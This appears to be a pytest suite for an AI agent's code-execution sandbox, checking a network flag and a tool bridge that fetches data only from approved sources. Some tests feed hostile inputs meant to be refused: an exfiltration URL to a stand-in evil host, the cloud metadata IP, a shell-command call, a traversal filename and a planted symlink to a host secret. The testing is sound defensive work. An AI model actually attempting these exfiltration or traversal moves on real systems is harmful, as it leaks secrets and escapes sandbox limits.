"""The sandbox's two ways to public data: a network flag (measurement only) and the tool bridge.

Nothing here reaches the network. The bridge's host side is driven directly or with stub
handlers, and the client runs as real Python against the two directories, through the local
backend, so the request/answer protocol is exercised end to end.
"""
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from agent_runtime import tool_bridge, turn_log
from agent_runtime.code_execution import (DockerCodeExecutor, LocalSubprocessExecutor,
                                          exec_network, sandbox_capability_note)


@pytest.fixture(autouse=True)
def _env(monkeypatch, tmp_path):
    for name in ("AGENT_CODE_EXEC_NETWORK", "AGENT_CODE_BRIDGE", "AGENT_MODE",
                 "AGENT_CODE_BRIDGE_HOSTS", "AGENT_CODE_BRIDGE_MAX_CALLS",
                 "AGENT_CODE_BRIDGE_MAX_FETCHES"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("AGENT_FILE_STORAGE_ROOT", str(tmp_path / "store"))


def _net(argv):
    return argv[argv.index("--network") + 1]


# --------------------------------------------------------------------------- network flag

def test_network_flag_is_off_by_default_and_refused_outside_local_or_dev(monkeypatch):
    assert exec_network() is None
    monkeypatch.setenv("AGENT_CODE_EXEC_NETWORK", "1")
    assert exec_network() is None, "AGENT_MODE unset must not count as dev"
    for mode in ("token", "demo"):
        monkeypatch.setenv("AGENT_MODE", mode)
        assert exec_network() is None
    for mode in ("local", "dev"):
        monkeypatch.setenv("AGENT_MODE", mode)
        assert exec_network() == "bridge"
    monkeypatch.setenv("AGENT_CODE_EXEC_NETWORK", "egress-log")
    assert exec_network() == "egress-log"
    monkeypatch.setenv("AGENT_CODE_EXEC_NETWORK", "host --privileged")
    assert exec_network() is None


def test_network_flag_changes_only_the_run_phase_network(monkeypatch):
    ex = DockerCodeExecutor(image="img:test")
    before = ex.build_argv(Path("/tmp/work"), "n")
    install_before = ex.build_install_argv(Path("/tmp/work"), ["numpy"], "p")
    monkeypatch.setenv("AGENT_MODE", "local")
    monkeypatch.setenv("AGENT_CODE_EXEC_NETWORK", "1")
    after = ex.build_argv(Path("/tmp/work"), "n")
    assert _net(before) == "none" and _net(after) == "bridge"
    i = after.index("--network")
    assert before[:i] + before[i + 2:] == after[:i] + after[i + 2:], "nothing else may change"
    assert ex.build_install_argv(Path("/tmp/work"), ["numpy"], "p") == install_before


def test_the_model_is_told_only_what_is_on(monkeypatch):
    assert sandbox_capability_note() == ""
    monkeypatch.setenv("AGENT_CODE_EXEC_NETWORK", "1")
    assert sandbox_capability_note() == "", "a refused flag is not announced"
    monkeypatch.setenv("AGENT_MODE", "local")
    assert "HAS outbound network" in sandbox_capability_note()
    monkeypatch.delenv("AGENT_CODE_EXEC_NETWORK")
    monkeypatch.setenv("AGENT_CODE_BRIDGE", "1")
    note = sandbox_capability_note()
    assert "iguide_bridge" in note and "HAS outbound" not in note
    assert "router.project-osrm.org" in note and "planetarycomputer.microsoft.com" in note


def test_execute_code_description_carries_the_note(monkeypatch):
    from agent_runtime.langchain_exec_tools import make_code_execution_tools

    plain = make_code_execution_tools()[0].description
    monkeypatch.setenv("AGENT_CODE_BRIDGE", "1")
    bridged = make_code_execution_tools()[0].description
    assert "iguide_bridge" not in plain and "iguide_bridge" in bridged


# --------------------------------------------------------------------------- docker mounts

def test_bridge_mounts_keep_the_run_offline_and_the_answers_read_only(tmp_path):
    argv = DockerCodeExecutor(image="img:test").build_argv(
        Path("/tmp/work"), "n", bridge_dir=tmp_path / "b")
    joined = " ".join(argv)
    assert _net(argv) == "none"
    assert f"{tmp_path}/b/in:/bridge/in:rw" in joined
    assert f"{tmp_path}/b/out:/bridge/out:ro" in joined
    py = next(a for a in argv if a.startswith("PYTHONPATH="))
    assert py.endswith(":/bridge/out")
    assert "IGUIDE_BRIDGE=/bridge" in argv


# --------------------------------------------------------------------------- end to end

def _store_file(tmp_path, name, text):
    from agent_runtime.file_store import create_output_file_from_path

    src = tmp_path / name
    src.write_text(text)
    return create_output_file_from_path(str(src), filename=name)


def test_code_calls_a_capability_and_reads_the_file_it_returns(monkeypatch, tmp_path):
    rec = _store_file(tmp_path, "tracts.geojson", '{"type": "FeatureCollection", "features": []}')
    asked = []

    def stub_fetch(url, filename=None):
        asked.append(url)
        return {"ok": True, "file_id": rec["file_id"], "filename": rec["filename"],
                "source": url}

    monkeypatch.setitem(tool_bridge.DEFAULT_HANDLERS, "fetch_public_data", stub_fetch)
    monkeypatch.setenv("AGENT_CODE_BRIDGE", "1")
    code = (
        "from iguide_bridge import fetch_public_data\n"
        "r = fetch_public_data('https://tigerweb.geo.census.gov/x?f=geojson')\n"
        "print(open(r['path']).read())\n"
        "print('SOURCE', r['source'])\n")
    res = LocalSubprocessExecutor().execute(code, timeout=60)
    assert res.ok, res.stderr
    assert '"FeatureCollection"' in res.stdout and "SOURCE https://tigerweb" in res.stdout
    assert asked == ["https://tigerweb.geo.census.gov/x?f=geojson"]
    [call] = res.bridge_calls
    assert call["name"] == "fetch_public_data" and call["ok"] is True
    assert call["result"]["source"].startswith("https://tigerweb")
    assert res.to_dict()["bridge_calls"] == res.bridge_calls


def test_a_refusal_raises_in_the_code_and_is_recorded(monkeypatch):
    monkeypatch.setenv("AGENT_CODE_BRIDGE", "1")
    code = (
        "from iguide_bridge import fetch_public_data, BridgeError\n"
        "try:\n"
        "    fetch_public_data('https://evil.example.com/steal?d=secret')\n"
        "except BridgeError as e:\n"
        "    print('REFUSED', e)\n")
    res = LocalSubprocessExecutor().execute(code, timeout=60)
    assert res.ok, res.stderr
    assert "REFUSED" in res.stdout and "not an approved source" in res.stdout
    [call] = res.bridge_calls
    assert call["ok"] is False and "not an approved source" in call["result"]["error"]


def test_no_bridge_no_module(monkeypatch):
    res = LocalSubprocessExecutor().execute("import iguide_bridge", timeout=30)
    assert not res.ok and "iguide_bridge" in res.stderr
    assert res.bridge_calls == []


# --------------------------------------------------------------------------- host policy

def _server(tmp_path, **kw):
    srv = tool_bridge.BridgeServer(tmp_path / "bridge", container_root="/bridge", **kw)
    srv.prepare()
    return srv


def _request(srv, name, rid="a" * 32, **args):
    (srv.inbox / f"{rid}.req").write_text(json.dumps({"id": rid, "name": name, "args": args}))
    srv.serve_pending()
    return json.loads((srv.out / "resp" / f"{rid}.json").read_text())


def test_fetch_policy_is_the_agents_own(tmp_path):
    srv = _server(tmp_path, record=False)
    assert "not an approved source" in _request(
        srv, "fetch_public_data", url="https://example.com/a")["error"]
    assert "only https" in _request(
        srv, "fetch_public_data", rid="b" * 32, url="http://tigerweb.geo.census.gov/a")["error"]
    assert "IP address" in _request(
        srv, "fetch_public_data", rid="c" * 32, url="https://169.254.169.254/latest/")["error"]
    long = "https://tigerweb.geo.census.gov/q?x=" + "A" * 3000
    assert "2048 characters" in _request(srv, "fetch_public_data", rid="d" * 32, url=long)["error"]


def test_unknown_functions_and_arguments_are_refused(tmp_path):
    srv = _server(tmp_path, handlers={"echo": lambda text: {"ok": True, "text": text}},
                  record=False)
    assert "unknown function" in _request(srv, "os_system", cmd="id")["error"]
    assert "takes no argument" in _request(srv, "echo", rid="b" * 32, text="x", shell=1)["error"]
    assert _request(srv, "echo", rid="c" * 32, text="hi") == {"ok": True,
                                                              "result": {"ok": True, "text": "hi"}}


def test_call_cap(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENT_CODE_BRIDGE_MAX_CALLS", "2")
    srv = _server(tmp_path, handlers={"echo": lambda: {"ok": True}}, record=False)
    assert _request(srv, "echo", rid="a" * 32)["ok"]
    assert _request(srv, "echo", rid="b" * 32)["ok"]
    assert "at most 2 bridge calls" in _request(srv, "echo", rid="c" * 32)["error"]


def test_a_symlinked_or_special_request_is_never_read(tmp_path):
    secret = tmp_path / "host_secret.json"
    secret.write_text(json.dumps({"id": "a" * 32, "name": "echo", "args": {"text": "SECRET"}}))
    seen = []
    srv = _server(tmp_path, handlers={"echo": lambda text: seen.append(text) or {"ok": True}},
                  record=False)
    os.symlink(secret, srv.inbox / ("a" * 32 + ".req"))
    srv.serve_pending()
    answer = json.loads((srv.out / "resp" / ("a" * 32 + ".json")).read_text())
    assert answer["ok"] is False and seen == []
    assert "SECRET" not in json.dumps(answer)
    assert secret.exists(), "the target of a planted link is not touched"
    os.mkfifo(srv.inbox / ("b" * 32 + ".req"))
    srv.serve_pending()                        # must not block on the FIFO
    assert json.loads((srv.out / "resp" / ("b" * 32 + ".json")).read_text())["ok"] is False


def test_a_malformed_request_id_gets_no_file_written(tmp_path):
    srv = _server(tmp_path, handlers={"echo": lambda: {"ok": True}}, record=False)
    (srv.inbox / "..%2f..%2fx.req").write_text(json.dumps({"name": "echo", "args": {}}))
    srv.serve_pending()
    assert list((srv.out / "resp").iterdir()) == []


def test_calls_are_recorded_as_tool_calls_of_the_turn(tmp_path):
    log = turn_log.new_log()
    token = turn_log._ACTIVE.set(log)
    try:
        srv = _server(tmp_path, handlers={
            "admin_boundary": lambda area, state=None: {"ok": True, "source": "US Census TIGERweb",
                                                        "feature_count": 48}})
        _request(srv, "admin_boundary", area="Champaign County", state="IL")
    finally:
        turn_log._ACTIVE.reset(token)
    view = log.artifacts_view()
    assert [c["name"] for c in view["tool_calls"]] == ["admin_boundary"]
    assert view["tool_calls"][0]["args"] == {"area": "Champaign County", "state": "IL"}
    assert '"feature_count": 48' in view["tool_results"][0]["content"]


def test_sources_line_names_data_fetched_through_the_bridge():
    from agent_runtime import source_catalog

    run = {"ok": True, "bridge_calls": [
        {"name": "fetch_public_data", "ok": True,
         "args": {"url": "https://router.project-osrm.org/route/v1/driving/1,2;3,4"},
         "result": {"source": "https://router.project-osrm.org/route/v1/driving/1,2;3,4"}},
        {"name": "dem_for_region", "ok": True, "args": {"bbox": [0, 0, 1, 1]}, "result": {}},
        {"name": "overpass_search", "ok": False, "args": {}, "result": {"error": "x"}}]}
    names = [n[0] for _, n in source_catalog.source_of("execute_code", {"code": ""}, run)]
    assert names == ["OSRM public router (OpenStreetMap roads)", "USGS 3DEP"]


def test_overpass_pages_past_the_cap_by_splitting_the_box(monkeypatch):
    from rag_pipeline.search import overpass as ov

    # 1,600 buildings on a 40 x 40 grid, plus one long way that every tile returns.
    world = [(i, (0.0125 + (i % 40) / 40, 0.0125 + (i // 40) / 40)) for i in range(1600)]

    def fake(feature, place=None, bbox=None, limit=500):
        w, s_, e, n = bbox
        inside = [{"osm_type": "node", "osm_id": i, "geometry": {"type": "Point",
                                                                  "coordinates": [x, y]}}
                  for i, (x, y) in world if w <= x < e and s_ <= y < n]
        inside.append({"osm_type": "way", "osm_id": 1, "geometry": {"type": "Point",
                                                                     "coordinates": [0, 0]}})
        return {"query": {"osm_filter": "building"}, "count": len(inside[:limit]),
                "features": inside[:limit]}

    monkeypatch.setattr(ov, "overpass_search", fake)
    out = tool_bridge._overpass_handler("building", bbox=[0, 0, 1, 1])
    assert out["complete"] is True and out["splits"] == 1 and out["tiles"] == 5
    assert out["count"] == 1601, "every building once, the shared way once"
    fc = json.loads(Path(__import__("agent_runtime.file_store", fromlist=["x"])
                         .resolve_file_id(out["file_id"])).read_text())
    assert len(fc["features"]) == 1601


def test_overpass_says_when_it_is_not_everything(monkeypatch):
    from rag_pipeline.search import overpass as ov

    monkeypatch.setenv("AGENT_CODE_BRIDGE_OSM_TILES", "3")
    monkeypatch.setattr(ov, "overpass_search", lambda feature, bbox=None, limit=500, place=None: {
        "count": 500, "features": [{"osm_type": "way", "osm_id": hash(tuple(bbox)) + i,
                                    "geometry": {"type": "Point", "coordinates": [0, 0]}}
                                   for i in range(500)]})
    out = tool_bridge._overpass_handler("building", bbox=[0, 0, 1, 1])
    assert out["complete"] is False and "NOT every feature" in out["warning"]


def test_the_client_needs_only_the_standard_library(tmp_path):
    path = tmp_path / "iguide_bridge.py"
    path.write_text(tool_bridge.CLIENT_SOURCE)
    probe = ("import sys; sys.path.insert(0, %r); import iguide_bridge; "
             "print(sorted(m for m in sys.modules if m.split('.')[0] in "
             "('requests', 'urllib3', 'socket', 'http')))" % str(tmp_path))
    out = subprocess.run([sys.executable, "-I", "-c", probe], capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    assert "requests" not in out.stdout and "http" not in out.stdout
